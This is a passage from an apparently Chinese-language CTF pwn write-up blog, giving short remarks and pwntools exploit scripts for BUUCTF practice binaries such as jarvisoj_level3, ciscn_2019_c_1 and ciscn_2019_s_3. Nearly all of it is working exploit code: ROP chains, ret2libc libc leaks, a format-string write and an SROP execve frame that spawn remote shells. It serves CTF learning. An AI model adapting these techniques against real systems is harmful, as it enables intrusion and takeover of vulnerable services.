class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27403</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x600A90</span></span><br><span class="line">system = <span class="number">0x4004C0</span></span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">ret = <span class="number">0x4004a1</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27974</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level3&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(e.plt[<span class="string">&#x27;write&#x27;</span>])+p32(</span><br><span class="line">    e.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>])+p32(<span class="number">1</span>)+p32(e.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;write_addr: &#x27;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh_addr)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h3><p>这题有个神奇的地方，查看汇编会发现他是没有布置rbp的，直接就是返回地址了。往往简单的程序会有这种现象，具体原因未知。goodgame函数可以直接读出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26823</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./guestbook&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">good_game = <span class="number">0x400620</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(good_game)  <span class="comment"># 没有rbp</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;message:\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27306</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fm&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x804A02C</span></span><br><span class="line">payload = <span class="string">b&#x27;%4c%13$n&#x27;</span>+p32(target)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b* 0x80485AD&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>p64的时候会有多余的\x00截断length函数，所以实际上真正的payload不用担心被加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25628</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def enc(message):</span></span><br><span class="line"><span class="comment">#     ans = &#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     for k in message:</span></span><br><span class="line"><span class="comment">#         k = ord(k)</span></span><br><span class="line"><span class="comment">#         if (k &lt;= 96 or k &gt; 122):</span></span><br><span class="line"><span class="comment">#             if (k &lt;= 64 or k &gt; 90):</span></span><br><span class="line"><span class="comment">#                 if (k &gt; 47 and k &lt;= 57):</span></span><br><span class="line"><span class="comment">#                     k ^= 0xf</span></span><br><span class="line"><span class="comment">#             else:</span></span><br><span class="line"><span class="comment">#                 k ^= 0xe</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             k ^= 0xd</span></span><br><span class="line"><span class="comment">#         ans += chr(k)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">puts_plt = <span class="number">0x6020C0</span></span><br><span class="line">rdi_ret = <span class="number">0x400C83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">start_addr = <span class="number">0x400790</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(rdi_ret)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + \</span><br><span class="line">    p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(start_addr)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;be encrypted&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts)</span><br><span class="line">libc_base = libc_puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(ret)+p64(rdi_ret)+p64(binsh_addr) + \</span><br><span class="line">    p64(system_addr)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;be encrypted&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><p>没看出来这题和上一道题有什么不同，可能两题做的隔的时间太长了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27205</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + \</span><br><span class="line">    p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + \</span><br><span class="line">    p64(e.symbols[<span class="string">&#x27;encrypt&#x27;</span>])  <span class="comment"># p64中的\x00可以截断加密长度</span></span><br><span class="line"><span class="comment"># payload = enc(payload)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input your choice!&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;to be encrypted&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_puts = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_puts))</span><br><span class="line"><span class="comment"># 2.27_2</span></span><br><span class="line">libc_base = libc_puts-<span class="number">0x809c0</span></span><br><span class="line">system = libc_base+<span class="number">0x4f440</span></span><br><span class="line">binsh = libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;, libc_puts)</span></span><br><span class="line"><span class="comment"># system = libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;to be encrypted&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27747</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400713</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + \</span><br><span class="line">    p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;tell me your name&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;say to me?&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">libc_puts = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;libc_puts: &#x27;</span>+<span class="built_in">hex</span>(libc_puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;, libc_puts)</span></span><br><span class="line"><span class="comment"># system = libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.27_2</span></span><br><span class="line">libc_base = libc_puts-<span class="number">0x809c0</span></span><br><span class="line">system = libc_base+<span class="number">0x4f440</span></span><br><span class="line">binsh = libc_base+<span class="number">0x1b3e9a</span></span><br><span class="line"><span class="comment"># log.success(hex(libc))</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;tell me your name&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;say to me?&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27416</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x11&#x27;</span>*(<span class="number">4</span>*<span class="number">13</span>+<span class="number">1</span>)  <span class="comment"># var变量是四字节类型的数据</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>这题做的时候被LibcSearcher搞红温了，后来发现程序里有sh字符……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25918</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line">system = e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = <span class="number">0x80482ea</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system) + \</span><br><span class="line">    <span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)  <span class="comment"># 中间的junk不要放奇奇怪怪的东西，不然脚本会有奇奇怪怪的问题</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;password:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;log info:&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h3><p>这题给了一些inc的gadget，但是如果要用那些gadget来直接执行execve的话，脚本的运行时间和数据传输量相当可怕……如果要用mov rax , 3Bh的gadget来ret2syscall的话，没法直接控制rdx清零。但是可以通过控制edx来清零。这里还是乖乖srop吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28969</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sigreturn_addr = <span class="number">0x4004DA</span></span><br><span class="line">rax_exec = <span class="number">0x4004E2</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0x4004F1</span>))</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = <span class="number">59</span></span><br><span class="line">execve.rdi = binsh_addr</span><br><span class="line">execve.rsi = <span class="number">0</span></span><br><span class="line">execve.rdx = <span class="number">0</span></span><br><span class="line">execve.rsp = <span class="number">0</span></span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + \</span><br><span class="line">    p64(sigreturn_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(execve)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>flag捉迷藏靶机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28707</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x400490</span></span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line">ret = <span class="number">0x400479</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27; name?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># 找不到flag？grep -r &#x27;flag&#123;&#x27;是个好东西</span></span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span 